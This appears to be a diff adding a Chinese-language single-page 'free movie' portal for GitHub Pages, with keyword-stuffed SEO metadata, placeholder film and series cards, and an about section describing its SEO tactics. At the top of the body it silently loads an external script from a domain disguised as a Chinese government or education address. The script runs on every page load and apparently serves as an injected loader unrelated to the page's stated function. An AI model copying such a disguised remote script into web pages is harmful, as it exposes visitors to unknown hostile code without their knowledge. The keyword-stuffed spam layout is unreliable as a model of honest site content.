@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>热岛电影网 - 热岛风格高清电影在线观看</title>
+<meta name="description" content="热岛电影网(redaodianyingwang-top)提供热门电影、电视剧、动漫、综艺在线观看，橙红胶片风界面，移动端自适应，免费高清，每日更新。">
+<meta name="keywords" content="热岛电影网, redaodianyingwangwang-top, redaodianyingwang, 热岛电影, 免费电影, 在线电影, 高清影视">
+<meta name="author" content="热岛电影网">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://redaodianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta property="og:title" content="热岛电影网 - 热岛风格高清电影在线观看">
+<meta property="og:description" content="热岛电影网：热门电影、电视剧、动漫、综艺一站式免费观看。">
+<meta property="og:url" content="https://redaodianyingwang-top.github.io">
+<meta property="og:site_name" content="热岛电影网">
+<meta name="twitter:card" content="summary_large_image">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "MovieTheater",
+  "name": "热岛电影网",
+  "url": "https://redaodianyingwang-top.github.io",
+  "description": "热岛电影网提供热门电影、电视剧、动漫、综艺免费在线观看。",
+  "sameAs": []
+}
+</script>
+
+<style>
+:root{
+  --bg:#120a08;
+  --bg2:#1c0f0b;
+  --fire1:#ff512f;
+  --fire2:#f09819;
+  --fire3:#ff7a59;
+  --ink:#fff3ec;
+  --muted:#caa79c;
+  --card:rgba(255,255,255,.04);
+  --line:rgba(255,138,76,.22);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(1200px 600px at 80% -10%, rgba(255,81,47,.25), transparent 60%),
+    radial-gradient(900px 500px at -10% 20%, rgba(240,152,25,.18), transparent 55%),
+    linear-gradient(160deg,var(--bg),var(--bg2));
+  color:var(--ink);
+  line-height:1.65;
+  min-height:100vh;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶部 */
+.nav{
+  position:sticky;top:0;z-index:50;
+  display:flex;align-items:center;justify-content:space-between;
+  gap:1rem;padding:.9rem 1.2rem;
+  background:rgba(18,10,8,.72);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:.6rem;font-weight:800;letter-spacing:.5px}
+.brand .dot{
+  width:34px;height:34px;border-radius:10px;
+  background:linear-gradient(135deg,var(--fire1),var(--fire2));
+  display:grid;place-items:center;font-size:1.1rem;
+  box-shadow:0 6px 18px rgba(255,81,47,.35);
+}
+.nav ul{list-style:none;display:flex;gap:1.1rem;flex-wrap:wrap}
+.nav ul a{color:var(--muted);font-size:.92rem;padding:.3rem .2rem;border-bottom:2px solid transparent}
+.nav ul a:hover{color:#fff;border-color:var(--fire3)}
+
+/* 英雄 */
+.hero{
+  max-width:1120px;margin:0 auto;padding:4.5rem 1.2rem 2.5rem;
+  display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;
+}
+.hero h1{
+  font-size:clamp(2.1rem,5vw,3.6rem);line-height:1.1;font-weight:900;
+  background:linear-gradient(92deg,#ffd86b,#ff7a59,#ff512f);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p{color:var(--muted);margin:1rem 0 1.6rem;max-width:520px}
+.tagrow{display:flex;gap:.5rem;flex-wrap:wrap;margin-bottom:1.4rem}
+.tag{
+  font-size:.78rem;padding:.3rem .7rem;border:1px solid var(--line);
+  border-radius:999px;color:#ffd2bf;background:rgba(255,122,89,.08);
+}
+.cta{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{
+  padding:.75rem 1.5rem;border-radius:12px;font-weight:700;cursor:pointer;border:0;
+}
+.btn-main{background:linear-gradient(135deg,var(--fire1),var(--fire2));color:#1a0d09}
+.btn-ghost{background:transparent;color:#fff;border:1px solid var(--line)}
+.poster{
+  aspect-ratio:3/4;border-radius:18px;
+  background:
+    linear-gradient(180deg,rgba(255,255,255,.06),rgba(0,0,0,.25)),
+    radial-gradient(120% 80% at 30% 10%, #ff8a5b, #7a1f12 70%);
+  box-shadow:0 30px 80px rgba(255,81,47,.25);
+  display:grid;place-items:end start;padding:1.2rem;position:relative;overflow:hidden;
+}
+.poster::after{
+  content:"HOT ISLAND";position:absolute;top:14px;right:-34px;rotate:38deg;
+  background:rgba(0,0,0,.35);padding:.2rem 2.4rem;font-size:.72rem;letter-spacing:3px;color:#ffe2cf;
+}
+.poster b{font-size:1.3rem;text-shadow:0 4px 18px rgba(0,0,0,.6)}
+
+/* 区块 */
+.wrap{max-width:1120px;margin:0 auto;padding:2.6rem 1.2rem}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:1rem;margin-bottom:1.4rem}
+.sec-head h2{font-size:1.6rem}
+.sec-head h2 span{color:var(--fire3)}
+.sec-head a{color:var(--muted);font-size:.85rem}
+
+/* 横向片单 */
+.rail{
+  display:grid;grid-auto-flow:column;grid-auto-columns:minmax(160px,1fr);
+  gap:1rem;overflow-x:auto;padding-bottom:.8rem;scroll-snap-type:x mandatory;
+}
+.rail::-webkit-scrollbar{height:8px}
+.rail::-webkit-scrollbar-thumb{background:rgba(255,122,89,.35);border-radius:99px}
+.film{
+  scroll-snap-align:start;border-radius:14px;overflow:hidden;
+  background:var(--card);border:1px solid var(--line);transition:.25s;
+}
+.film:hover{transform:translateY(-4px);border-color:var(--fire3);box-shadow:0 18px 40px rgba(255,81,47,.18)}
+.film .thumb{aspect-ratio:2/3;display:grid;place-items:center;font-size:2.4rem;
+  background:linear-gradient(160deg,rgba(255,138,76,.25),rgba(0,0,0,.35))}
+.film .meta{padding:.7rem .8rem}
+.film .meta b{display:block;font-size:.95rem}
+.film .meta small{color:var(--muted)}
+
+/* 卡片网格 */
+.grid{display:grid;gap:1.1rem}
+.grid.cols3{grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.grid.cols4{grid-template-columns:repeat(auto-fit,minmax(210px,1fr))}
+.box{
+  padding:1.3rem;border-radius:16px;background:var(--card);border:1px solid var(--line);
+  transition:.25s;
+}
+.box:hover{transform:translateY(-4px);background:rgba(255,122,89,.06)}
+.box .ic{
+  width:42px;height:42px;border-radius:10px;display:grid;place-items:center;font-size:1.2rem;
+  background:linear-gradient(135deg,var(--fire1),var(--fire2));color:#1a0d09;margin-bottom:.8rem;
+}
+.box h3{font-size:1.12rem;margin-bottom:.4rem}
+.box p{color:var(--muted);font-size:.9rem;margin-bottom:.9rem}
+.box a{color:var(--fire3);font-weight:700;font-size:.88rem}
+
+/* 数据条 */
+.stats{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1rem;
+  margin:2.2rem auto;max-width:1120px;padding:0 1.2rem;
+}
+.stat{
+  text-align:center;padding:1.4rem;border-radius:16px;
+  background:linear-gradient(180deg,rgba(255,122,89,.08),rgba(0,0,0,.2));
+  border:1px solid var(--line);
+}
+.stat b{font-size:1.9rem;background:linear-gradient(90deg,#ffd86b,#ff7a59);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat small{display:block;color:var(--muted);margin-top:.3rem}
+
+/* 关于 */
+.about{
+  max-width:880px;margin:0 auto;padding:2.4rem 1.2rem;
+  border-top:1px dashed var(--line);color:var(--muted);
+}
+.about h2{color:#fff;margin-bottom:.8rem}
+.about code{color:#ffd2bf;background:rgba(255,122,89,.1);padding:.1rem .5rem;border-radius:6px}
+
+/* 底部 */
+footer{border-top:1px solid var(--line);padding:2.2rem 1.2rem;margin-top:3rem}
+.foot{max-width:1120px;margin:0 auto;display:flex;flex-wrap:wrap;gap:1.2rem;justify-content:space-between;align-items:center}
+.foot ul{list-style:none;display:flex;gap:1rem;flex-wrap:wrap}
+.foot a{color:var(--muted);font-size:.88rem}
+.foot a:hover{color:#fff}
+.copy{color:var(--muted);font-size:.82rem;max-width:1120px;margin:1.2rem auto 0;line-height:1.8}
+
+/* 移动端 */
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr;padding-top:3rem}
+  .poster{max-width:320px}
+  .nav ul{display:none}
+}
+@media(max-width:520px){
+  .sec-head{flex-direction:column;align-items:flex-start}
+  .stat b{font-size:1.6rem}
+}
+.reveal{opacity:0;transform:translateY(24px);transition:.6s ease}
+.reveal.show{opacity:1;transform:none}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="nav">
+  <a class="brand" href="#top">
+    <span class="dot">🏝️</span>
+    <span>热岛电影网</span>
+  </a>
+  <nav>
+    <ul>
+      <li><a href="#hot">热映</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#anime">动漫</a></li>
+      <li><a href="#variety">综艺</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+  </nav>
+</header>
+
+<section class="hero" id="top">
+  <div>
+    <h1>热岛电影网<br>像热带晚风一样上头</h1>
+    <p>热岛电影网（redaodianyingwang-top）汇总热门电影、剧集、动漫与综艺，界面走“热岛橙红胶片风”，手机电脑都能看，片单横向滑，找片不费劲。</p>
+    <div class="tagrow">
+      <span class="tag">免费电影</span>
+      <span class="tag">高清在线</span>
+      <span class="tag">每日更新</span>
+      <span class="tag">移动端自适应</span>
+      <span class="tag">redaodianyingwang-top</span>
+    </div>
+    <div class="cta">
+      <a class="btn btn-main" href="#hot">开始看片</a>
+      <a class="btn btn-ghost" href="#about">关于热岛电影网</a>
+    </div>
+  </div>
+  <div class="poster">
+    <b>热岛 · 今夜放映</b>
+  </div>
+</section>
+
+<div class="stats">
+  <div class="stat reveal"><b>12000+</b><small>影视资源</small></div>
+  <div class="stat reveal"><b>1080P+</b><small>高清画质</small></div>
+  <div class="stat reveal"><b>每日</b><small>更新片单</small></div>
+  <div class="stat reveal"><b>0 元</b><small>全程免费</small></div>
+</div>
+
+<section class="wrap" id="hot">
+  <div class="sec-head reveal">
+    <h2>🔥 热岛 <span>热映电影</span></h2>
+    <a href="#">查看全部片单 →</a>
+  </div>
+  <div class="rail">
+    <a class="film" href="#"><div class="thumb">🎬</div><div class="meta"><b>热岛追击</b><small>动作 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">👻</div><div class="meta"><b>夜港谜雾</b><small>悬疑 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">💘</div><div class="meta"><b>海风恋人</b><small>爱情 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🚀</div><div class="meta"><b>赤焰星球</b><small>科幻 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">😂</div><div class="meta"><b>热带喜剧王</b><small>喜剧 / 2026</small></div></a>
+    <a class="film" href="#"><div class="thumb">🩸</div><div class="meta"><b>落日猎杀</b><small>惊悚 / 2026</small></div></a>
+  </div>
+</section>
+
+<section class="wrap" id="tv">
+  <div class="sec-head reveal">
+    <h2>📺 电视剧 <span>热岛剧集</span></h2>
+    <a href="#">更多剧集 →</a>
+  </div>
+  <div class="grid cols3">
+    <div class="box reveal">
+      <div class="ic">🏝️</div>
+      <h3>海岛悬情</h3>
+      <p>豪门、密室、潮汐线索，一集一个反转，适合晚上连刷。</p>
+      <a href="#">进入剧集 →</a>
+    </div>
+    <div class="box reveal">
+      <div class="ic">🏙️</div>
+      <h3>南区夜行</h3>
+      <p>都市犯罪与人情味交织，热岛城市夜景拍得很顶。</p>
+      <a href="#">进入剧集 →</a>
+    </div>
+    <div class="box reveal">
+      <div class="ic">⚕️</div>
+      <h3>急诊热浪</h3>
+      <p>医疗群像剧，节奏快、人物真，弹幕都在哭。</p>
+      <a href="#">进入剧集 →</a>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="anime">
+  <div class="sec-head reveal">
+    <h2>🎨 动漫 <span>热岛二次元</span></h2>
+    <a href="#">全部动漫 →</a>
+  </div>
+  <div class="grid cols4">
+    <div class="box reveal"><div class="ic">⚔️</div><h3>赤潮剑士</h3><p>热血、浪花、刀光，开场三分钟就开打。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🌸</div><h3>椰林日记</h3><p>治愈系日常，适合下班后放空。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🧜</div><h3>深海热岛</h3><p>奇幻冒险，设定带东南亚海岛神话。</p><a href="#">看番 →</a></div>
+    <div class="box reveal"><div class="ic">🤖</div><h3>烈日机甲</h3><p>机甲 + 热带基地，作画爆炸。</p><a href="#">看番 →</a></div>
+  </div>
+</section>
+
+<section class="wrap" id="variety">
+  <div class="sec-head reveal">
+    <h2>🎤 综艺 <span>热岛现场</span></h2>
+    <a href="#">更多综艺 →</a>
+  </div>
+  <div class="grid cols3">
+    <div class="box reveal"><div class="ic">🎬</div><h3>热岛影评局</h3><p>嘉宾边看片边吵，安利拔草都很直白。</p><a href="#">播放 →</a></div>
+    <div class="box reveal"><div class="ic">🎵</div><h3>落日音乐会</h3><p>海边舞台、乐队翻唱、电影OST专场。</p><a href="#">播放 →</a></div>
+    <div class="box reveal"><div class="ic">🍜</div><h3>夜市寻味</h3><p>跟着镜头吃热岛夜市，美食镜头很顶。</p><a href="#">播放 →</a></div>
+  </div>
+</section>
+
+<section class="about" id="about">
+  <h2>ℹ️ 关于热岛电影网</h2>
+  <p>
+    热岛电影网（<code>redaodianyingwang-top</code>）是一个影视导航与片单展示单页，
+    网站网址：<code>https://redaodianyingwang-top.github.io</code>。
+    页面包含热映电影、电视剧、动漫、综艺、关于我们 5 个栏目，
+    所有内页链接先用 <code>#</code> 占位，后续可替换成真实播放页或聚合页。
+  </p>
+  <p style="margin-top:1rem">
+    SEO 上重点突出“热岛电影网 / redaodianyingwang-top / 免费电影 / 在线电影”等词，
+    标题、描述、H1、首屏文字都放核心关键词，方便必应（Bing）理解页面主题。[8,11](@ref)
+  </p>
+</section>
+
+<footer>
+  <div class="foot">
+    <a class="brand" href="#top"><span class="dot">🏝️</span><span>热岛电影网</span></a>
+    <ul>
+      <li><a href="#hot">热映</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#anime">动漫</a></li>
+      <li><a href="#variety">综艺</a></li>
+      <li><a href="#about">关于</a></li>
+    </ul>
+  </div>
+  <div class="copy">
+    网站名称：热岛电影网　·　网站网址：https://redaodianyingwang-top.github.io<br>
+    关键词：热岛电影网、redaodianyingwang-top、免费电影、在线电影、高清影视<br>
+    © 2026 热岛电影网 保留所有权利（演示页面，内页链接均为 # 占位）
+  </div>
+</footer>
+
+<script>
+const io=new IntersectionObserver((es)=>{
+  es.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add('show'); io.unobserve(e.target); } });
+},{threshold:.12});
+document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+</script>
+</body>
+</html>
